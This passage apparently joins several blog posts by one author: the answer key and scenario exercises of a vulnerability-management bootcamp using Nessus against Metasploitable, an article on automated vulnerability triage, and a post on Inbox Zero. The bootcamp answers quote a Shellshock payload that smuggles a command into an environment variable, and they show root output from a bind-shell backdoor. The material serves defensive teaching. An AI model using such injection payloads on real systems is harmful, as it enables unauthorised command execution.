0). You can find this by going to the scan configuraiton wizard settings, going to ‚ÄúAssessment ‚Äì&gt; Web Applications‚Äù, toggling ‚ÄúScan web applications‚Äù and then looking at the default value in the ‚ÄúUse a customer User-Agent‚Äù field. Back to Question Answer 4. 3SYN. You can find this by going to the scan configuration wizard settings, going to ‚ÄúDiscovery ‚Äì&gt; Port Scanning‚Äù, scrolling down to the ‚ÄúNetwork Port Scanners‚Äù section and then seeing that only the ‚ÄúSYN‚Äù check-box is checked (TCP and UDP are not checked by default). Back to Question Exercise 5 Answers: Answer 5. 1The CVSS v2. 0 Vector for the Shellshock vulnerability is AV:N/AC:L/Au:N/C:C/I:C/A:C. ‚ÄúAC:L‚Äù means that the ‚ÄúAccess Complexity‚Äù for successfully exploiting this vulnerability is Low. In other words, exploiting this issue is trivial, thus its Critical severity rating. Back to Question Answer 5. 2In this case, Nessus actually physically exploited the vulnerability. It did so as can be seen in the plugin output below‚Ä¶ Nessus was able to set the TERM environment variable used in an SSHconnection to :() { :;}; /usr/bin/id &gt; /tmp/nessus. 1619029506Back to Question Answer 5. 3This is somewhat of a subjective question, but in my mind, the highest risk issue is the ‚ÄúBind Shell Backdoor Detection‚Äù finding. This is not only immediately exploitable but also evidence of previous/current system compromise. In other words, an attacker is likely already on the system! In fact, Nessus was even able to exploit this vulnerability as shown in the output below. Nessus was able to execute the command id using thefollowing request :This produced the following truncated output (limited to 10 lines) :------------------------------ snip ------------------------------root@metasploitable:/# uid=0(root) gid=0(root) groups=0(root)root@metasploitable:/#Back to Question Answer 5. 4By going to the ‚ÄúRemediations‚Äù tab within the credentialed scan results, we can see a list of ‚ÄúActions‚Äù. Each action represents a patch or other mitigation that can be applied and how many vulns that patch will fix. The top ‚ÄúAction‚Äù is ‚ÄúUbuntu 8. 04 LTS : linux vulnerabilities (USN-1105-1): Update the affected packages. ‚Äù which according to Nessus will fix 234 vulnerabilities. Though this may in fact reduce a lot of risk on the system, it still wouldn‚Äôt be the highest thing I would prioritize. This is why manual analysis is so important as opposed to relying on what Nessus tells you via it‚Äôs automated semi-prioritization methodology. Back to Question Exercise 6 Answers: Answer 6. 1A ‚ÄúFilter‚Äù can be created in the ‚ÄúVulnerabilities‚Äù tab first. This filter should have the criteria ‚ÄúSeverity is equal to Critical‚Äù. Once this filter has been applied, any report that is generated will just be for the filtered vulnerabilities. Back to Question Answer 6. 2There are a number of different parties that may be interested in receiving different kinds of reports from Nessus. Some of these groups are listed below. IT Leadership may be interested in a report which has a high level breakdown of how many vulnerabilities are present within the organization‚Äôs overall environment. VM Analysts may be interested in a report that has particularly high-risk vulnerabilities in it. System Administrators may be interested only in vulnerabilities that affect systems they own. They may also be interested only in vulnerabilities which match particular SLA criteria (meaning which vulnerabilities do they need to address soon. ) IT Managers - May be interested in vulnerabilities which affect all the systems within their department. They may also just be interested in high level number of vulnerabilities. Back to Question Scenario-Based ExercisesAt this point, you‚Äôve learned the pre-requisite knowledge recommended to succeed in a VM role and you‚Äôve acquired real hands-on experience doing VM tasks with Nessus. This section is the culmination of all the work you‚Äôve put in throughout this bootcamp. Below is a progressive series of six exercises, each mapping to a different stage of the VM lifecycle. They are designed to test your knowledge and evaluate your thought process as it relates to real-world VM scenarios. They are all open-ended such that there are no ‚Äúanswers‚Äù, rather they are more abstract thought exercises. I recommend you go through each, writing up a quick paragraph or two on how you would solve each of the prompts. Optionally, I invite you to contact me (or start a discussion on the Discord) with your writeups and we can discuss your answers. At that time, I can give you my opinions and feedback on your answers. Again, there is not necessarily a single right answer to any of these prompts. You are also welcome to contact me if there are any other questions about these scenarios. With all that said, let‚Äôs introduce the scenario-based exercises. NOTE: These exercises require that you have completed all the exercises within the bootcamp! Scenario 1: IDENTIFYAn automated Nessus scan identified the Ghostcat vulnerability (plugin 134862) on a host. An automated report was sent to the system owner detailing the finding. The system owner has contacted the VM team (you) and is claiming the finding is a false-positive. How would you go about addressing this claim? Scenario 2: CLASSIFYThe CISO has asked the VM team (you) to provide a list of the top 10 highest-risk vulnerabilities present within the organization‚Äôs environment. Assume Metasploitable is the entirety of the environment. What would be the top 10 vulnerabilities and how did you come to this determination? Scenario 3: ANALYZEUpon receiving the scan report of the Metasploitable system, IT leadership has asked that the VM team (you) put together a risk assessment for the ‚ÄúNFS Exported Share Information Disclosure‚Äù (plugin 11356) finding. This finding has been identified on other systems within the network and leadership wants a more thorough understanding of the risk. Create this risk assessment, come up with a final risk determination and think of any additional questions you may need answered to accurately come up with this designation. Scenario 4: PRIORITIZEIn Scenario 2, we came up with a list of the top 10 highest risk vulnerabilities. We now need to prioritize the remediation of all findings within the Metasploitable scan report. How would you suggest prioritizing these fixes? Would you recommend fixing them in the order you specified earlier? If so or if not, explain why. I would recommend making some assumptions on a few things‚Ä¶ What data is stored/processed by the Metasploitable system (in theory). What resources are available for patching or implementing other defensive measures? etc‚Ä¶Scenario 5: REPORTNessus Essentials has limited reporting options. Given you had more flexibility in how you create reports and what content exactly they could contain, in what formats and with what content would you suggest for reports being sent to the following groups‚Ä¶ IT Leadership Company Executives IT System Owners VM StaffScenario 6: REMEDIATE/MITIGATEThe Metasploitable system is overrun with vulnerabilities. Swift action must be taken to mitigate risk. What are the first 3 things you would recommend for mitigating this risk? HINT: Think beyond patches and consider alternative approaches to risk mitigation. How to Find a VM JobCongrats! Presumably, you are through the bootcamp and are now faced with the challenge of actually finding and applying to relevant positions within VM that you could be qualified for. Below is a quick list of tips for hunting down applicable positions. Expand. Your. Search. Look and apply everywhere. Linkedin, Monster, SimplyHired, Reddit, Craigslist, Dice, Indeed, Company career pages, Glassdoor, etc‚Ä¶ There may be a lot of overlap but widening the set of sources you use is a good start. I‚Äôll also add that volume of applications can be your friend. Yes, it is definitely work, and yes, it is frustrating to be turned down (again and again), but perseverance is key and applying to a lot of places will statistically up the probability you get an opportunity. Don‚Äôt be afraid to apply. What I mean is - yes, you want to avoid applying to places that you are completely unqualified for but don‚Äôt be too scared off by job reqs that ask for N years of experience. If it sounds like you can do what is being asked of you in the job req, or you at least have some or most of the qualifications, you need not worry that you don‚Äôt check every box. Don‚Äôt embellish or lie on your resume. You don‚Äôt need to. This is an entry-level job and they don‚Äôt expect you to know everything. If you‚Äôve never used a tool, don‚Äôt list it. If you‚Äôve used it once or twice though, put it on your resume! Everything on your resume is fair game and you should be ready to, at a minimum, explain what a tool is, what it does and in what capacity you have used it. ‚ÄúVulnerability‚Äù is a good search term. A lot of VM jobs (unsurprisingly I guess) have titles which include ‚ÄúVulnerability‚Äù in it in some fashion (e. g. ‚ÄúSenior Engineer, Vulnerability Management‚Äù, ‚ÄúVulnerability Management Analyst‚Äù, ‚ÄúVulnerability Engineer‚Äù, ‚ÄúVulnerability Management Security Engineer - Security Operations‚Äù, etc‚Ä¶) There is no standard title for VM, these are job titles I pulled off of a job board today! Play around with these search terms to cast the best possible net. Not every company has positions that are pure VM. In many cases, VM responsibilities fall within the ‚ÄúSIOC‚Äù or engineering teams and as such, these jobs require experience or skills far beyond what is covered in this bootcamp. I would recommend reading the job req and trying to determine what percentage of the daily responsibilities involve VM versus other engineering/SIOC-type-work. You may still be eligible for that position or the hiring manager may be willing to bring you in for your VM experience alone, as long as you are willing to learn the other facets of the role (and you should be eager to learn as much as possible!)I will add additional tips here as I think of them. Now, let‚Äôs talk about the interview‚Ä¶ VM InterviewSo you‚Äôve gone through the bootcamp, applied to some VM positions and now have an interview scheduled. Well done! It‚Äôs time to put it all together and knock it outta the park. Below, I have a few quick tips on your interview as well as a series of common interview questions (and some possible answers where appropriate). Interview Tips Don‚Äôt be afraid to admit you don‚Äôt know something. If you‚Äôre asked a question you don‚Äôt know, state that you don‚Äôt know or are not sure, but always offer to explain your thought process for answering the question. Interviewers want to know how you think moreso than necessarily if you have the ‚Äúright‚Äù answer. In many cases there may be no right answer, so always offer up your thoughts. Try to keep them brief and to the point though - rambling on when you are very unsure can certainly be a turn-off for an interviewr. Be enthusiastic. This is true of any interview but particularly potent for entry-level / junior interviews. Those in charge of hiring understand that junior applicants may not have any real experience (you do though!), and it can be really hard to truly gauge someones technical acumen. What‚Äôs not hard however, is to see if someone is truly interested in the role and passionate about infosec. Have plenty of questions. Be ready to ask a lot of questions, this if nothing else will show interest in the role. Some example questions are‚Ä¶ What tools does the team use? What is the makeup of the team now? What are the biggest challenges that the team currently faces? Where would you like the program to be in 1 year? What about 2 years? What does success look like to you for someone coming into this role? If you don‚Äôt know something or are otherwise stumped by a question, always return to being very interested and excited about learning more on that topic. Where it applies, you can even mention things you are learning currently that are related to that topic. Be ready to explain the things you do at home / in-your-free-time to stay up-to-date on all things infosec. Podcasts, RSS feeds, Reddit, Mastodon, infosec blogs, building a homelab, etc‚Ä¶ Be yourself (within reason). Interview Questions Q: What port is HTTPS typically on? ¬∑ A: 443 but it is also commonly found on port 8443. Q: What are some vulnerabilities you are familiar with? ¬∑ A: Reference the Vulnerabilties section for some good ideas. Q: What is the difference between TCP and UDP? ¬∑ A: Reference the Networking section for some good ideas. But remember TCP is connection-oriented while UDP is not.

I define Vulnerability Triage as the process of identifying disclosed vulnerabilities, mapping the affected products within these vulnerability disclosures to an environment inventory and then ultimately making decisions on how to address these correlated findings through subsequent analysis and prioritization. In other words, as new vulnerabilities are disclosed (i. e. as a CVE through NVD), there is a process to determine if systems in an environment are potentially affected. If so, what is the risk and what should be done about it? A high level depiction of this process is illustrated below. *The ‚ÄúDecision‚Äù diamond in this diagram represents how the findings are ultimately processed with respect to escalation, remediation and mitigation. Every organization that has a VM program (and that really should be every organization) is doing some variation of this process. They may not explicitly call it ‚ÄúVulnerability Triage‚Äù, but they are doing it all the same. In my experience building and running VM programs over the years I have identified a number of commonalities, pitfalls, bottlenecks, high-friction areas and other points of interest related to this process of Vulnerablity Triage. The goal of this article is to describe in detail these findings, and how we can leverage orchestration to perform enterprise-grade vulnerability triage at scale while eliminating some of the common friction points and bottlenecks I have alluded to. Jump to Section: Vulnerability Management Primer Vulnerability Triage Deep-Dive Symphonic Vulnerability Surface Mapping (SVSM) SVSM Using VulnscapeA Primer on Vulnerability ManagementFirst, let‚Äôs quickly go over the concept of Vulnerability Management (a. k. a. ‚ÄúVM‚Äù). VM in a nutshell is the continuous process of identifying, classifying, analyzing, prioritizing, reporting, remediating and mitigating vulnerabilities. VM is ubiquitous in enterprise environments as it is fundamental to understanding (technical) risk across the information systems that comprise an IT organization. Without VM, gaps in protection (vulnerabilities) are not identified or not properly addressed which can lead to very real consequences such as exploitation, system compromise, data loss, compliance/regulatory violations and even full-scale breach of an organizations environment. In fact, VM is so fundamental it comes in third place (as of version 7. 1) in the CIS (Center for Internet Security) top 20 ‚ÄúCritical Security Controls‚Äù. These 20 CIS controls collectively represent a prioritized set of actions which have been established as best practices for mitigating a large majority of attacks against systems and networks. In essence, VM is pretty crucial to enterprise security, falling only behind hardware/software inventory with respect to priority. This dependency is further illustrated below. Before moving on let‚Äôs quickly cover the aforementioned inventory prerequisite. CIS Control 1: Hardware Inventory and CIS Control 2: Software Inventory as precursory actions are paramount to achieving effective VM. Essentially, you can‚Äôt hope to manage vulnerabilities in an environment whereby you don‚Äôt have a complete understanding of all the software and hardware assets in that setting. The common saying being, you can‚Äôt protect what you don‚Äôt know about. Vulnerability Triage Deep-DiveAlright, now that we have a basic understanding of vulnerability triage and how it fits within the overarching Vulnerability Management process, let‚Äôs take a closer look at the individual steps for triage. These steps are summarized as well as illustrated in the respective list and diagram below. Vulnerability Triage Process Steps Step 0 ( Pre-Triage ): Build/maintain a comprehensive and accurate asset inventory Step 1: Ingest vulnerability data/intelligence Step 2: Correlate vulnerability data with asset inventory Step 3: Leverage metadata from vulnerability/asset data sources to perform risk analysis Step 4: *Prioritize findings Step 5 ( Post-Triage ): **Treatment of findings*More primitive implementations of vulnerability triage may not include the prioritization step. This can be considered an optional advanced element. **Vulnerability treatment(s) are not considered part of the vulnerability triage process. It is listed merely as a means to show it‚Äôs relationship to the other portions of the triage process. Vulnerability Triage Process Diagram Vulnerability Triage Levels: The goal of vulnerability triage is to make decisions on how a vulnerability should be treated. Triage can involve a relatively quick analysis of whether a vulnerability is applicable to a specific environment all the way to full in-depth analysis of a particular vulnerability and how it affects specific systems. This scale from simple to thorough can be described using the levels detailed below. Each of the levels below can be considered ‚Äúvulnerability triage‚Äù, just at different depths. Level 1: Answers the simple question, ‚ÄúIs there any exposure?‚Äù. (i. e. are there vulnerabilities that affect products within an environment which do not have patches or controls which mitigate said vulnerability). Level 2: Does the vulnerability meet any criteria that may result in the vulnerability being particularly high or critical risk? This involves taking a cursory glance at vulnerability and asset metadata. Level 3: Partial risk analysis. Get a better understanding but not necessarily a full risk determination. Level 4: Complete risk analysis. Get a complete understanding of risk to the environment. Level 5: Complete risk analysis and prioritization. Get not only a complete understanding of the risk to the environment but prioritize how that finding will be addressed in the context of other findings. Now that we have a high level picture of the vulnerability triage process and some of the ways it can be defined, let‚Äôs dive a little deeper into each step‚Ä¶ Asset Inventory: Having an accurate, comprehensive, up-to-date inventory of all software and hardware in an environment is one of the most important components of Vulnerability Triage. In the absence of a single-source of record or master inventory, you can leverage multiple disparate sources of inventory. Some examples of asset inventory sources are listed below. Inventory Sources IT Asset Management tools (ITAM) Configuration Management Databases (CMDB) GRC platforms (e. g. Archer, ServiceNow, Jira SD, etc‚Ä¶) Application Lifecycle Managment (ALM) tools Cloud inventory tools (e. g. AWS Systems Manager, AWS Config, etc‚Ä¶) Other (e. g. IPAM, scanning tools, etc‚Ä¶)Within these inventory sources, or as part of the master asset inventory, there is certain metadata we are interested in for vulnerability triage. Some examples of information elements of interest are listed below. Ultimately, this data is used to answer two essential questions, what is our high-level exposure? and what is the risk of any specific vulnerability as it applies to an affected system? Inventory Metadata Vendor / product / version of software and hardware Unique system identifier (e. g. IP, hostname, netbios, etc‚Ä¶) Ownership (e. g. business vertical, technical owner, etc‚Ä¶) Data classification processed/stored by that system Externality (e. g. external, internal, cloud, etc‚Ä¶) Scope of affected systems System to system relationships/affinitiesHaving a single master inventory with all of the aforementioned data would certainly make the process of vuln triage much easier. However, this information is not always readily available. In many organizations, there may be reliance on multiple inventory sources that collectively represent the entire environment. Or worse, there may be only a partial inventory or no real inventory at all! With respect to metadata, I suspect it is quite rare to have all the information detailed in the list above. The good news is however, as detailed in the section on triage levels, vulnerability triage does not require everything listed. At a minimum, we need only a decent inventory which includes basic product information ideally mapped to individual asset identifiers. This could at least get us to a level 1 triage. Put differently, if the inventory can tell us that product X exists on systems A, B and C, we are in good shape. With this, you can certainly make basic triage decisions. From there, the more additional information you have, the more detailed your analysis can be (achieving higher level triage) which in turn removes the added overhead required for manual analysis and ultimately yields better prioritization results. Vulnerability Intelligence: Alright! Once we have a solid asset inventory, we now need to collect information on known/disclosed vulnerabilities. I refer to this process of collecting vulnerability data and parsing the relevant metadata as Vulnerability Intelligence. There is a plethora of vulnerability data sources both open-source/free as-well-as commercial we can leverage. From these vulnerability sources, we need to collect certain bits of metadata which help with vuln-to-product correlation as well as risk analysis. Below, I list a number of potential vulnerability data sources as well as some examples of important vulnerability metadata. Sources Vulnerability feeds (e. g. NVD, MITRE, Security Tracker, etc‚Ä¶) VM vendor feeds (e. g. Qualys, Tenable, Rapid7) Security bulletins (e. g. CISA, AWS, Android, Microsoft, Oracle, etc‚Ä¶) Exploit databases (e. g. exploit-db, vuldb, SecurityFocus, packet storm, vulners, etc‚Ä¶) Social media (e. g. Twitter, etc‚Ä¶) RSS (e. g. Feedly, curated research sources, etc‚Ä¶) *Threat Intelligence sources Consider support for the Common Security Advisory Framework (CSAF). and more‚Ä¶*As a side note, I wanted to quickly cover the difference between the concept of ‚ÄúVulnerability Intelligence‚Äù and that of traditional Threat Intelligence (TI) (at least from my point of view). Where I delineate between the two is the idea that threat intel exists only where there are known (active) threats targeting an organization. Vulnerability intelligence on the other hand is where you have vulnerabilities which affect systems within an organizations environment. Together, where you have both a threat and a vulnerability, you have potential risk (the simple formula below represents this calculation). As you can (also) see via the image below, threat intel is typically a subset of vulnerability intel and is much smaller in volume. Finally, where you have known threats targeting vulnerabilities present in your environment you will likely need to invoke a vulnerability escalation process. THREAT * VULNERABILITY = RISK Vulnerability Metadata Affected vendor / product / version CVSS Base metrics (e. g. vector, complexity, privileges, user interaction, impact) CVSS Temporal metrics (e. g. exploit code maturity, remediation level, report confidence) Evidence of active exploitation in the wild Dwell-time (how long has the vulnerability been known)All together, there is no shortage of sources to retrieve vulnerability data from and a wealth of relevant metadata to collect from within these sources. In fact, it is best practice when performing vuln triage / risk analysis to reference a multitude of disparate sources to build the most complete picture of the true risk of a vulnerability. The more information you have, the more detailed you can be ( higher vuln triage level ) in that analysis and the higher fidelity your ultimate risk determination will be. With that said, you won‚Äôt always have a uniform/standardized view of a vulnerability and will need to make due with what is available. Similar to the inventory step, you need at a minimum the affected product (plus version) as well as SOME manner of vulnerability metadata. The more metadata you have, the more precise you can be in your risk determination. Correlating Vulnerability Intelligence with Asset Inventory: OK, so we have our asset inventory and we have vulnerability intelligence to pair with it. From here we perform simple correlation between the products known to exist in our environment and the known vulnerabilities which affect those products. This rudimentary process is illustrated below. Typically, this correlation is performed through the process of Vulnerability Scanning. This article doesn‚Äôt seek to cover scanning in much depth but it will be explained with the detail required to understand it‚Äôs function within the vulnerability triage process. In brief, vulnerability scanners are used to systematically detect and classify weaknesses on systems. Scanners perform this task in a variety of ways. By either authenticating directly then pulling a software inventory or by performing anonymous footprinting of a system, scanners can identify products and product versions across it‚Äôs scanned hosts. It then matches these identified products/versions using it‚Äôs own built in ‚Äúplugins‚Äù which correspond to known vulnerabilities that affect respective products/versions. So if vulnerability scanners are already doing this correlation, what is the problem? Network vulnerability scanning tools rely on plugins provided by the scanner vendor to identify/correlate vulnerabilities. This means that if the vendor does not develop a plugin, a vulnerability may not be identified. Plugins from the scanner vendors are not developed and released in real-time. This means there is some dwell-time between when a vulnerability is disclosed and when the vendor has developed a plugin available to identify it in an environment. This dwell-time means manual analysis may need to be performed for vulnerabilities which require immediate attention. Scans of an environment are not performed real-time. Therefore, the data you are working with within the scan tool may be outdated when performing vulnerability triage correlation activities. Scans are inherently invasive. This means there will be systems that can not be scanned or do not support scanning activities. In these cases, you will have a blind spot with traditional scan-based vuln triage. For the vast majority of vulnerabilities, the speed in which findings must be ‚Äútriaged‚Äù or otherwise analyzed for risk is completely satisfied by automated vulnerability scanning. In that world, high-risk findings are expected to be patched within some pre-set SLA timeframe, medium-risk findings have a different SLA and so on‚Ä¶ It is the edge-cases (typically potential critical-risk findings), where manual triage is invoked and in those situations, there are improvements to be made. Take for example a high-profile vulnerability or a zero-day vulnerability that has been announced by CISA in a bulletin. Below are some example steps a security analyst/team might take in triaging this vulnerability. CISA announces a vulnerability that exhibits a few high/critical risk characteristics. This disclosure is collected via a vulnerability intelligence source (such as Twitter). A security analyst (or VM team) takes this disclosure/alert and begins vulnerability triage. The security analyst first checks to see what products/versions are affected by the disclosed vulnerability. The analyst then reviews known inventory sources (CMDB, scanners, etc. . ) to determine if the affected products exist within the organization‚Äôs environment. If the product doesn‚Äôt exist in the environment, the issue is closed. However if the affected product does exist in the environment, further analysis must be performed. The analyst will want to determine whether the vulnerability meets the (or exhibits certain) criteria for a critical (or maybe even high) risk finding. If the vulnerability is definitely not high/critical in nature, this often means no further manual triage is necessary. The vulnerability will be addressed via the normal vulnerability management process within the defined SLAs. If however, the vulnerability does have certain high/critical-risk criteria, it should be further analyzed to determine technical risk and whether emergency or accelerated actions must be taken. The analyst performs a thorough risk analysis of the finding based on any and all vulnerability metadata and metadata about the affected assets. Where possible, the analyst will further enrich this risk determination based on known mitigating factors such as technical controls which may further reduce the residual risk. Technical risk determination is then coupled with business context to come up with a final risk score. Based on this residual risk value, a determination is made on how to prioritize mitigation/remediation/patching/risk treatments. Phew!. That is quite a process right? If used sparingly, it really isn‚Äôt that much work. But at scale, performing this series of steps manually can be a time consuming task. This means, where security staffing is limited and quick decision making is needed, traditional vulnerability triage via scanning and manual analysis is not sufficient. Enter a new method for vuln triage‚Ä¶ Symphonic Vulnerability Surface MappingSymphonic Vulnerability Surface Mapping (‚ÄúSVSM‚Äù) is a new approach to vulnerability triage and attack surface mapping. The idea is to ingest vulnerabilities in real-time from a wide variety of sources, correlate the vulnerability metadata (specifically affected product/version) with known inventory (also in real-time) and then (optionally) calculate risk and make prioritization decisions based on a fully-automated (or semi-automated) analysis engine. Let‚Äôs talk about how this can be done‚Ä¶ Identify vulnerability intelligence sources. Build individual ingestors to extract normalized vulnerability metadata from different vulnerability data sources. Leverage a metadata-parsing-engine (MPE) (leveraging ML, keywords, etc. . ) to facilitate extraction of relevant metadata from sources with non-standard formats. Develop individual ingestors to populate asset inventory and extract normalized asset metadata from unique inventory sources. Perform basic correlation of vulnerability and asset inventory data to determine high-level applicability and exposure. Store correlated data in a database. *Leverage advanced risk analysis engine (RAE) to perform automated risk analyses at scale. *With risk scores in hand, deliver prioritized plan for addressing vulnerabilities. *Steps 7 and 8 as described above are considered more advanced/higher order versions of your basic vulnerability triage process. Ultimately, this process provides real-time feedback on potential exposures, risk calculations related to these findings and context for making treatment decisions. It does this at a speed which can not be obtained using traditional manual triage and automated scanning processes. Security Control Plane (Advanced/Optional): The Security Control Plane is a means in which to provide further enrichment to the risk analysis process. To fully understand the risk of any vulnerability as it applies to an affected system, one must also understand how the security controls in that environment help mitigate potential risks relevant to the vulnerability. For example, if you have software that prevents execution of non-whitelisted binaries, then vulnerabilities which require execution of an untrusted binary may be rendered completely ineffective. This understanding of security controls and how they effectively mitigate vulnerabilities can be applied to the risk analysis engine to better enrich residual risk determinations. SVSM FAQ: So what make‚Äôs SVSM different? Real-time correlation, analysis and prioritization of vulnerabilities as they are disclosed across a multitude of vulnerability intelligence feeds. SVSM takes what has always been a manual or relatively slow process and turns it into something that is real-time, dynamic and fully automated. What‚Äôs the catch? SVSM requires a relatively high-fidelity asset inventory. This inventory must at a minimum include product/version information mapped to unique system identifiers. Why use multiple vulnerability intelligence sources? No one vulnerability intelligence source has all relevant metadata needed to perform thorough risk analysis of a vulnerability as it applies to an affected system. Often in the process of risk analysis multiple sources are used to ultimately derive the final risk score. By parsing/ingesting data from a variety of sources, we can augment single-source analysis and get the clearest picture of risk. What if I don‚Äôt have a lot of metadata? No problem! SVSM is more than capable of performing correlation, risk analysis and decision making even with low-fidelity metadata. This flexibility provides the ability to perform everything from simple triage (am I exposed?) all the way to fully automated attack-surface mapping and risk analysis with robust prioritization. What‚Äôs with the name ‚ÄúSymphonic Vulnerability Surface Mapping‚Äù? SVSM is a new take on an age-old process. It utilizes the benefits of automation and orchestration to solve the issues that have always plagued vulnerability triage. SVSM is just my way of marketing this idea. The use of the term ‚Äúsymphonic‚Äù is a play on the established concept of ‚Äúorchestration‚Äù. Risk AnalysisIn the context of vulnerability triage and SVSM, manual risk analysis is the nut we are trying to crack. Performing triage at scale is undoubtedly cumbersome and risk analysis as a component of that process is certainly one of the worst offenders from an overhead perspective. So how can we automate? First, let‚Äôs understand what criteria we are interested in when determining risk and how we use that criteria to calculate risk. Risk Criteria: Vulnerability disclosure date (When was the vulnerability first published?) Vulnerability dwell-time (The length of time a vulnerability has been present on a system) Patch publish date (When, if applicable, was the patch itself published?) Does the vulnerability affect business-critical systems? Does the vulnerability affect systems which store/process sensitive data? System type (e. g. database, server, network device, workstation, etc‚Ä¶) Scope (i. e. limited vs. widespread) Externality (e. g. internal, external, segmented, etc‚Ä¶) Mitigating Controls ( Security Control Plane ) CVSS Base score (vector, complexity, privileges required, user interaction) CVSS Temporal score (exploit code availability, patch availability, confidence level)Risk Matrix: So how is risk typically calculated in practice? A simple risk matrix as shown below is an easy way to qualitatively derive a risk determination. However, this matrix only considers likelihood (probability) and impact in a vacuum. What it does not take into account is business context. It is recommended to also understand the business context of a system when determining a final risk score. Vulnerability Escalation: As previously mentioned, not every vulnerability is worthy of manual triage. The overwhelming majority of vulnerabilities are expected to be addressed as a result of routine patching and standard prioritization sourced from typical vulnerability scanning activities. To determine which vulnerabilities ultimately require manual analysis, we use an escalation process flow coupled with a number of defined escalation criteria. This flow as well as the criteria are provided in more detail below. Escalation Criteria Zero-days Named/publicized ‚Äúdesigner‚Äù vulnerabilities Vulnerabilities that are being targeted by threat groups in an active campaign Critical-severity vulnerabilities that affect external-facing or sensitive assets Vulnerabilities that affect a wide scope of systems Vulnerabilities affecting business-critical systemsVulnerabilities which have one or more of these characteristics are often candidates for further analysis to determine if they require accelerated treatment. The vulnerability escalation process flow depicted below helps further illustrate this concept. Vulnerability Escalation Process Flow Prioritization: Presumably, if risk analysis is thorough, prioritization is mostly a question of fixing the highest risk things first and then moving down the list. In reality however, there are a few additional factors that could further influence how vulnerabilities are ultimately prioritized post-analysis. Level-of-effort (LoE) to patch Is there a patch, workaround or mitigating control available to further mitigate risk? Can applying a single fix remediate multiple vulnerabilities (or entire classes of vulnerabilites) at once? If so, and for example, there could be one fix which applies to a large number of medium-risk findings which if resolved at scale would reduce more risk than applying a single fix for a single high-risk finding. Treatment: Though not really in scope for vulnerability triage, I wanted to at least mention the final step, Vulnerability Treatment, as it is crucial to the overall process of vulnerability management. It is within this step that vulnerabilities are reported, patched, resolved, mitigated, or otherwise addressed. What could be more important! VulnscapeSVSM as a concept is being brought to life through a new open-source tool dubbed Vulnscape! This tool is in very early stages, but over time, the goal is to develop the following as modular components‚Ä¶ Vulnerability ingestors for the wide variety of potential vulnerability intelligence sources Asset inventory ingestors for the wide variety of enterprise asset inventory sources A Metadata Parsing Engine (MPE) that will be used to extract relevant vulnerability metadata from non-standard vulnerability data sources An automated (or semi-automated) Risk Analysis Engine (RAE) capable of risk-based decision making at scale Prioritization featuresWith version 1. 0, I aim to bring a limited set of inventory/vulnerability ingestors as well as a basic correlation capability (for high-level exposure notification). Stay tuned! Potential Applications: SVSM and Vulnscape have applications that I think extend beyond just simple-to-advanced vulnerability triage. I see applications/integration opportunities in other domains as well. For example, it could be used in penetration testing activities related to ‚Äúexploit suggesters‚Äù. Imagine hooking an SVSM tool like Vulnscape up to an exploit framework solution like Metasploit. Using this, you could more accurately target endpoints with exploits most likely to be successful. This is but one example of how Vulnscape could be applied beyond just vulnerability triage! ConclusionThanks for taking the time to read!

But there is a way‚Ä¶ a way to quell the torrent of spam, subscriptions, notifications, alerts, reminders, social media updates, promotions, confirmations and whatever else seeks to wreak havoc on your inbox - Inbox Zero. This concept was first introduced by Merlin Mann during a Google TechTalk in 2007. I‚Äôve never actually watched this video nor do I remember when I was first introduced to the idea of ‚ÄúInbox Zero‚Äù but I‚Äôve been very successful in remaining true to my idea of this concept for well over a decade and I‚Äôm here to say it has brought sanity and control to my digital life and it can for you too. What you see below is madness‚Ä¶ ‚Ä¶Madness? This. is. EMAIL! Let‚Äôs Zero It OutDespite it‚Äôs name, Inbox Zero is not about having nothing in your inbox. Rather, it is about having a repeatable process by which you can deal with each email you receive, which in turn gives you control over your inbox and reduces what remains to only the items that are either pending and/or actionable. Let‚Äôs walk through this process‚Ä¶ Unsubscribe: I recommend a scorched-earth approach to unsubscribing to subscription-based emails. Unless you absolutely need something, click that ‚Äúunsubscribe‚Äù button and be rid of it. Pro Tip: If an email doesn‚Äôt have an ‚ÄúUnsubscribe‚Äù link, mark it as spam or even create a mail rule to auto-send it where it belongs - anywhere but your inbox. Consume: A lot of email is simply informational. Anything in your inbox that matches this criteria can easily be archived (Step 5) or deleted (Step 6) once you have consumed the necessary information. If you find the information not-useful, perhaps consider Step 1. Take Action: Does the email represent something that needs to be done? If so, do what needs to be done and then archive (Step 5) or delete (Step 6) the respective email. If it can‚Äôt be done right now due to a dependency, see Step 4. *If it CAN be done but you don‚Äôt have time for it, simply leave it in your inbox until you can get to it. In this way, these emails will serve as constant reminders of things that need to and can be done. Save For Later: If an email represents something that needs to be done but can‚Äôt be done due to a dependency, move it to a separate folder (or label if your a Gmail person). I have a folder literally called ‚ÄúFor Later‚Äù that these to-do emails go to. All of these to-do emails should go to the same special ‚ÄúFor Later‚Äù folder. *It is important to revisit this folder on a frequent basis to see if there is anything that no longer has dependencies and is thus actionable. Here, you can do what needs to be done and then proceed to archive (Step 5) or delete (Step 6) the email. Archive: When you are through with an email but would like to keep it for later-reference, archive it or move it to a folder of your choosing. This will effectively remove it from your inbox. Trash: For everything else, trash it. You don‚Äôt need it. Get it out of your inbox. Pro Tip: Be mindful of what you are trashing. Chances are, if you are trashing an email, it should have never been in your inbox to begin with. I recommend unsubscribing from as many of these would-be-trashed emails as you can. Wrapping UpI‚Äôve always fancied myself a minimalist. This mindset helps me make ‚Äútough‚Äù decisions when it comes to unsubscribing, trashing or otherwise being ‚Äúreal‚Äù with myself about what I need or don‚Äôt need in my life. I‚Äôm also a particularly organized individual, especially with respect to my digital life. Inbox Zero is a manifestation of these two virtues and is a philosophy that with some practice, can be exercised by anyone. With it, you too can reclaim your inbox, get things done and achieve digital zen. For more on the science of Inbox Zero, check out Part Two!

